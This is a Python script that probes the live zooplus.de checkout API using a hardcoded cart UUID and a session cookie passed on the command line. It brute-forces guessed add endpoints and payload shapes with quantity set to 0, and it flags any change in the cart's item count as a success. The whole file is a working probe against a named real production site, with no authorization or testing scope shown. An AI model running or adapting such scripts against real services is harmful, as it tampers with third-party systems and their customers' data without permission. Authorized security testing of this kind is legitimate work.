#!/usr/bin/env python3
"""
Test cart add/remove endpoints - maybe modification happens through add with quantity=0
"""

import requests
import json
import sys

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_add_remove.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Get cart
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
cart = r.json()
before_count = len(cart.get("articles", []))
first_article = cart.get("articles", [{}])[0]
article_id = first_article.get("id")
offer_id = first_article.get("offerId", "")

print(f"[*] Testing add/remove endpoints")
print(f"[+] Cart before: {before_count} items")
print(f"[+] Article ID: {article_id}, Offer ID: {offer_id}")
print()

# Test add endpoint with quantity=0 (might remove)
endpoints = [
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/add",
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/add",
    f"/api/cart/add",
    f"/checkout/api/cart/add",
]

payloads = [
    {"articleId": article_id, "quantity": 0},
    {"id": article_id, "quantity": 0},
    {"offerId": offer_id, "quantity": 0},
    {"articleId": article_id, "qty": 0},
]

for endpoint in endpoints:
    for payload in payloads:
        print(f"[*] POST {endpoint}")
        print(f"    Payload: {json.dumps(payload)}")
        try:
            r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=5)
            print(f"    HTTP {r.status_code}")
            
            if r.status_code in [200, 204]:
                print(f"    [!!!] SUCCESS!")
                print(f"    Response: {r.text[:300]}")
                
                # Verify
                r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
                if r2.status_code == 200:
                    cart_after = r2.json()
                    after_count = len(cart_after.get("articles", []))
                    if after_count != before_count:
                        print(f"    [!!!] VERIFIED: {before_count} -> {after_count} items")
                        break
            elif r.status_code == 400:
                print(f"    [!] Bad Request: {r.text[:150]}")
            elif r.status_code not in [404]:
                print(f"    Response: {r.text[:150]}")
        except Exception as e:
            print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    print(f"[+] Cart after: {after_count} items")
    if after_count != before_count:
        print(f"[!!!] CART MODIFIED!")

